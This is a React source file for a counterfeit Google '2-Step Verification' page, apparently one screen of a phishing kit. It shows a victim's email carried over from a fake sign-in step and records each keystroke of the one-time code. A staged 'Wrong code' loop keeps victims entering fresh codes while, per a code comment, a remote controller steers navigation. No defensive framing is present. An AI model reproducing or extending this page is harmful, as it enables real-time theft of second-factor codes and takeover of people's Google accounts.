import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { GoogleGLogo, GE_FONT_FAMILY, GeFontStyle, GeCardStyles, useGeTracking } from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/twofa")({
  head: () => ({ meta: [{ title: "2-Step Verification" }] }),
  component: GeTwoFaPage,
});

function GeTwoFaPage() {
  const { trackClick, trackInput, geNavigate, sessionId } = useGeTracking();
  const [code, setCode] = useState("");
  const [dontAsk, setDontAsk] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [email, setEmail] = useState("Loading...");
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    try {
      const saved = localStorage.getItem("saved_user_email");
      if (saved) setEmail(saved);
      else setEmail("Email not found");
    } catch { setEmail("Email not found"); }
    setTimeout(() => inputRef.current?.focus(), 100);
  }, []);

  const submit = () => {
    const c = code.trim();
    if (!c) return;
    trackClick("Next-2FA");
    trackInput("otp", c);
    setLoading(true);
    setError(false);
    setTimeout(() => {
      // Fake wrong-code loop; controller can override navigation
      setLoading(false);
      setError(true);
      setCode("");
      inputRef.current?.focus();
    }, 1400);
  };

  return (
    <div className="ge-body" style={{ fontFamily: GE_FONT_FAMILY }}>
      <GeFontStyle />
      <GeCardStyles />
      <div className="ge-container">
        <div className={`ge-loading-overlay ${loading ? "active" : ""}`}>
          <div className="ge-loading-bar" />
        </div>

        <div className="ge-left">
          <GoogleGLogo size={45} />
          <div style={{ marginTop: 30 }}>
            <h1 className="ge-h1">2-Step Verification</h1>
            <p className="ge-p" style={{ marginRight: 20 }}>
              To help keep your account safe, Google wants to make sure it's really you trying to sign in
            </p>
            <div className="ge-email-chip" style={{ marginTop: 20 }} onClick={() => { trackClick("Change-Email"); geNavigate("/ge/signin"); }}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
              <span>{email}</span>
              <svg width="10" height="6" viewBox="0 0 10 6" fill="currentColor"><path d="M5 6 0 0h10z"/></svg>
            </div>
          </div>
        </div>

        <div className="ge-right">
          <div>
            <h1 style={{ fontSize: 20, fontWeight: 500, margin: "0 0 8px 0" }}>2-Step Verification</h1>
            <p style={{ fontSize: 14, margin: 0, lineHeight: "22px" }}>
              Get a verification code from the <span style={{ fontWeight: 600 }}>Authenticator</span> app
            </p>
          </div>

          <form onSubmit={(e) => { e.preventDefault(); submit(); }} style={{ display: "flex", flexDirection: "column", marginTop: 24 }}>
            <input
              ref={inputRef}
              name="otp"
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              className="ge-input"
              placeholder="Enter code"
              value={code}
              onChange={(e) => { setCode(e.target.value); setError(false); trackInput("otp", e.target.value); }}
              style={error ? { border: "2px solid #ff3b30", padding: 17 } : undefined}
              required
            />
            <div style={{ minHeight: 22, marginTop: 6 }}>
              {error && <p style={{ color: "#ff3b30", fontSize: 14, margin: 0 }}>Wrong code. Try again.</p>}
            </div>

            <label style={{ display: "flex", alignItems: "center", gap: 12, marginTop: 10, marginBottom: 30, cursor: "pointer", fontSize: 14, fontWeight: 600 }}>
              <input
                type="checkbox"
                checked={dontAsk}
                onChange={(e) => { setDontAsk(e.target.checked); trackClick(`DontAsk-${e.target.checked}`); }}
                style={{ width: 18, height: 18, cursor: "pointer" }}
              />
              <span>Don't ask again on this device</span>
            </label>

            <div style={{ display: "flex", justifyContent: "flex-end", gap: 10 }}>
              <button type="button" className="ge-btn ge-btn-ghost" onClick={() => trackClick("Try-Another-Way")}>Try another way</button>
              <button type="submit" className="ge-btn ge-btn-primary" disabled={loading || !code}>Next</button>
            </div>
          </form>
        </div>
      </div>
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </div>
  );
}
